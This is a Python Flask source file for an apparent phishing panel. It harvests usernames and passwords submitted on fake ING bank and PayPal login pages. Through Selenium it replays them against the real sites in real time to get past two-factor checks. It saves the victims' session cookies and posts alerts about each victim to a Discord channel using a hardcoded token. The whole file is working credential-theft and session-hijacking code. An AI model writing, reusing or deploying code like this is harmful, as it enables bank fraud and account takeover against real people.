import random
import requests
import time
from textwrap import wrap
from flask import Flask, render_template, redirect, url_for, request
from multiprocessing import Process
import app as application
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options as ChromeOptions
import requests
import textwrap
import pickle
import os
import threading


from pyngrok import ngrok
from flask_ngrok import run_with_ngrok




PATH = "C:\Program Files (x86)\chromedriver.exe"
delay = 19
chrome_options = ChromeOptions()
app = Flask(__name__)
driver = webdriver.Chrome(PATH, options=chrome_options)
#run_with_ngrok(app)

header = {"authorization" : "OTI3NTg0NzAwOTU0OTc2Mjg2.YdcvtQ.UtmLozZITD2rKM5W5PTpEcoMpAk"}

def ing():
    #driver = webdriver.Chrome(PATH, options=chrome_options)
    pwd = request.form['wachtwoord']
    usr = request.form['gebruikersnaam']
    try:
        blurusr = str(textwrap.wrap(usr,3)[0]+"****")
    except:
        blurusr = "******"
    payload = {'content': str("[!!ALERT!!] "+"new login on ING page user: "+blurusr)}
    requests.post("https://discord.com/api/v9/channels/948265516080963604/messages", data=payload, headers=header)
    driver.get("https://mijn.ing.nl/login")
    driver.find_element_by_name("username").send_keys(usr)
    driver.find_element_by_name("password").send_keys(pwd)
    driver.find_element_by_name("rememberUsername").click()
    driver.find_element_by_id("submitButton").click()
    try:
        WebDriverWait(driver, 4).until(EC.presence_of_element_located((By.NAME,"username")))
        print("FOUT")
        payload = {'content': str("[!!ALERT!!] "+blurusr+" filled in wrong password")}
        requests.post("https://discord.com/api/v9/channels/948265516080963604/messages", data=payload, headers=header)
        ing.app = False
    except:
        payload = {'content': str("[!!ALERT!!] "+blurusr+"now activating in app")}
        requests.post("https://discord.com/api/v9/channels/948265516080963604 /messages", data=payload, headers=header)
        ing.app = True

def loading():
    kanker = "Here's some example data"
    return render_template('paypal/loading.html', loader=kanker)





def paypalapp():
    print("kanker")
    timer = 0
    while driver.current_url != "https://www.paypal.com/myaccount/summary":
       timer +=1
    print(timer)
    cookies = r'D:\Pyhton\Anacond\panel\cookies'
    count = 0
    for path in os.listdir(cookies):
       # check if current path is a file
       if os.path.isfile(os.path.join(cookies, path)):
           count += 1
    pickle.dump(driver.get_cookies(), open("cookies/cookies"+str(count)+".pkl", "wb"))


def paypal():
    driver.delete_all_cookies()
    pwd = request.form['wachtwoord']
    usr = request.form['gebruikersnaam']
    print(pwd)
    print(usr)
    driver.get("https://www.paypal.com/signin?")
    WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH, "/html/body/div[1]/section[2]/div[1]/div/div[1]/div/form/div[3]/div[1]/div[2]/div[1]/input"))).send_keys(usr)
    WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH, "/html/body/div[1]/section[2]/div[1]/div/div[1]/div/form/div[3]/div[2]/button"))).click()
    time.sleep(2)
    WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH, "/html/body/div[1]/section[2]/div[1]/div/div[1]/div/form/div[4]/div[1]/div/div/div[1]/input"))).send_keys(pwd)
    driver.find_element_by_xpath("/html/body/div[1]/section[2]/div[1]/div/div[1]/div/form/div[4]/div[3]/button").click()
    error = False
    sms = False
    try:
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.XPATH,"/html/body/div[1]/section[1]/div[1]/div/div[1]/div/div[1]/p")))
        error = True

    except:
        paypal.error = False
        WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH,"/html/body/div[1]/div/div/div[2]/div[1]/div/fieldset/div/div/div[3]/button"))).click()
        try:
            WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.XPATH, "/html/body/div[1]/div/div/div[2]/div[1]/form/div[1]/div/div[2]/div[1]/div[1]/input")))
            paypal.sms = True
        except:
            paypal.sms = False
    return error, sms


@app.route("/ing", methods=["POST", "GET"])
def home():
    if request.method == "POST":
        ing()
        if ing.app == True:
            return render_template('ing/app.html')
        else:
            return render_template('ing/error.html')
    else:
        return render_template('index.html')

@app.route("/paypal", methods=["POST", "GET"])
def home1():
    if request.method == "POST":
        error, sms = paypal()
        if error == True:
            return render_template('paypal/wrongpwd.html')
        elif error == False:
            if paypal.sms == False:
                if request.method == "POST":
                    sms()
                else:
                    return render_template('paypal/2faphone.html')
            else:
                thread = threading.Thread(target=paypalapp)
                thread.start()
                return render_template('paypal/2fa.html')
    else:
        return render_template('paypal/2fa_keuze.html')



if __name__ == "__main__":
    #app.run()
    app.run(debug=True)



